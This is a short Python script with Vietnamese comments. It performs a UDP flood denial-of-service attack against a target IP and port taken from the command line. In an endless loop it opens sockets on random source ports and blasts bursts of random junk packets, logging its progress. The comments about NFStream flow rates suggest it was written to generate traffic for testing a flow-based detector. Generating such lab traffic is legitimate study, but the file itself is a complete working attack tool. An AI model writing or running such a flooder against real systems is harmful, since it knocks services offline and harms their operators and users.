import socket
import random
import sys
import time

target_ip = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.10"
# Mặc định đánh vào port 443 (HTTPS)
target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 443 

print(f"[*] Bắt đầu UDP Flood tấn công {target_ip}:{target_port} (Random Source Port)...")

# Tạo một gói tin rác ngẫu nhiên (kích thước 1024 bytes)
packet_size = 1024
random_bytes = random.randbytes(packet_size)

packet_count = 0
start_time = time.time()

try:
    while True:
        # 1. Khởi tạo một UDP Socket MỚI cho mỗi luồng
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # 2. BẮT BUỘC: Ép hệ điều hành cấp một Port Nguồn ngẫu nhiên mới tinh
        sock.bind(('', 0)) 
        
        # 3. Gửi một "chùm" 20 gói tin trên cùng 1 Port này
        # (Nếu chỉ gửi 1 gói rồi đổi port, NFStream sẽ không tính được pkt_rate. 
        # Gửi 20 gói giúp NFStream nhận diện đây là một "Luồng" và đo được tốc độ)
        for _ in range(20):
            sock.sendto(random_bytes, (target_ip, target_port))
            packet_count += 1
            
        # 4. Đóng Socket ngay lập tức để giải phóng Port và RAM (Chống lỗi Too many open files)
        sock.close()
        
        # In log mỗi ~10000 gói tin để biết script vẫn đang chạy
        if packet_count % 10000 == 0:
            print(f"[-] Đã gửi {packet_count} gói UDP rác với hàng ngàn Port khác nhau...")

except KeyboardInterrupt:
    end_time = time.time()
    duration = end_time - start_time
    print(f"\n[*] Đã dừng tấn công.")
    print(f"[*] Tổng số gói gửi: {packet_count} gói trong {duration:.2f} giây.")